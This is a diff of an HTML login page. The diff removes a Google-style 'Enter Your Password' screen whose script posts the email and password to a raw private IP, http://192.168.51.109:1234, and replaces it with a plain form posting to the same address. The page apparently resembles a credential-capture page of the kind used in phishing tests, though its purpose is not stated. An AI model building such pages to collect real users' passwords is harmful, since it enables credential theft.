@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enter Your Password</title>
+    <title>Login</title>
     <style>
         * {
             box-sizing: border-box;
@@ -20,13 +20,13 @@
             height: 100vh;
         }
         
-        .container {
+        .login-container {
             background-color: white;
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            padding: 40px;
+            box-shadow: 0 2px 18px rgba(0, 0, 0, 0.1);
+            padding: 48px;
             width: 100%;
-            max-width: 450px;
+            max-width: 480px;
         }
         
         h1 {
@@ -36,40 +36,8 @@
             font-weight: 500;
         }
         
-        .subtitle {
-            color: #666;
-            margin-bottom: 30px;
-            font-size: 14px;
-        }
-        
-        .email-container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background-color: #f9f9f9;
-            padding: 12px 15px;
-            border-radius: 4px;
-            margin-bottom: 25px;
-        }
-        
-        .email {
-            font-weight: 500;
-            color: #333;
-        }
-        
-        .edit {
-            color: #1a73e8;
-            text-decoration: none;
-            font-size: 14px;
-            cursor: pointer;
-        }
-        
-        .edit:hover {
-            text-decoration: underline;
-        }
-        
         .form-group {
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
         
         label {
@@ -80,24 +48,23 @@
             font-weight: 500;
         }
         
+        input[type="email"],
         input[type="password"] {
             width: 100%;
             padding: 12px 15px;
             border: 1px solid #ddd;
             border-radius: 4px;
             font-size: 16px;
-            transition: border 0.3s;
         }
         
-        input[type="password"]:focus {
+        input:focus {
             border-color: #1a73e8;
             outline: none;
         }
         
         .forgot-password {
-            display: block;
             text-align: right;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
         }
         
         .forgot-password a {
@@ -106,11 +73,7 @@
             font-size: 14px;
         }
         
-        .forgot-password a:hover {
-            text-decoration: underline;
-        }
-        
-        .continue-btn {
+        .login-btn {
             width: 100%;
             padding: 12px;
             background-color: #1a73e8;
@@ -118,13 +81,11 @@
             border: none;
             border-radius: 4px;
             font-size: 16px;
-            font-weight: 500;
             cursor: pointer;
-            margin-bottom: 25px;
-            transition: background-color 0.3s;
+            margin-bottom: 20px;
         }
         
-        .continue-btn:hover {
+        .login-btn:hover {
             background-color: #1765cc;
         }
         
@@ -138,121 +99,33 @@
             color: #1a73e8;
             text-decoration: none;
         }
-        
-        .signup-link a:hover {
-            text-decoration: underline;
-        }
-
-        .loading {
-            display: none;
-            text-align: center;
-            margin: 10px 0;
-            color: #666;
-        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Enter Your Password</h1>
-        <p class="subtitle">Enter your password to continue</p>
+    <div class="login-container">
+        <h1>Login</h1>
         
-        <div class="email-container">
-            <span class="email" id="emailDisplay">test@gmail.com</span>
-            <a class="edit" id="editEmail">Edit</a>
-        </div>
-        
-        <div class="form-group">
-            <label for="password">Password*</label>
-            <input type="password" id="password" placeholder="Enter your password">
-        </div>
-        
-        <div class="forgot-password">
-            <a href="#">Forgot password?</a>
-        </div>
-        
-        <div class="loading" id="loadingIndicator">Loading...</div>
-        
-        <button class="continue-btn" id="continueBtn">Continue</button>
+        <form action="http://192.168.51.109:1234" method="POST">
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" required placeholder="Enter your email">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required placeholder="Enter your password">
+            </div>
+            
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+            
+            <button type="submit" class="login-btn">Login</button>
+        </form>
         
         <p class="signup-link">
             Don't have an account? <a href="#">Sign up</a>
         </p>
     </div>
-
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const continueBtn = document.getElementById('continueBtn');
-            const passwordInput = document.getElementById('password');
-            const editLink = document.getElementById('editEmail');
-            const emailDisplay = document.getElementById('emailDisplay');
-            const loadingIndicator = document.getElementById('loadingIndicator');
-            
-            // Continue button click handler
-            continueBtn.addEventListener('click', function() {
-                const email = emailDisplay.textContent.trim();
-                const password = passwordInput.value.trim();
-                
-                if (!password) {
-                    alert('Please enter your password');
-                    return;
-                }
-                
-                // Show loading indicator
-                loadingIndicator.style.display = 'block';
-                continueBtn.disabled = true;
-                
-                // Create form data to send
-                const formData = new FormData();
-                formData.append('email', email);
-                formData.append('password', password);
-                
-                // Send data to the specified URL
-                fetch('http://192.168.51.109:1234', {
-                    method: 'POST',
-                    body: formData,
-                    // If your endpoint expects JSON:
-                    // headers: {
-                    //     'Content-Type': 'application/json',
-                    // },
-                    // body: JSON.stringify({
-                    //     email: email,
-                    //     password: password
-                    // }),
-                })
-                .then(response => {
-                    // Handle response from the server
-                    if (response.ok) {
-                        // If the server responds with a redirect, follow it
-                        window.location.href = 'http://192.168.51.109:1234';
-                    } else {
-                        throw new Error('Login failed');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    alert('An error occurred. Please try again.');
-                })
-                .finally(() => {
-                    loadingIndicator.style.display = 'none';
-                    continueBtn.disabled = false;
-                });
-            });
-            
-            // Edit email handler
-            editLink.addEventListener('click', function() {
-                const newEmail = prompt('Enter your email:', emailDisplay.textContent.trim());
-                if (newEmail !== null) {
-                    emailDisplay.textContent = newEmail;
-                }
-            });
-            
-            // Allow submitting with Enter key
-            passwordInput.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    continueBtn.click();
-                }
-            });
-        });
-    </script>
 </body>
 </html>
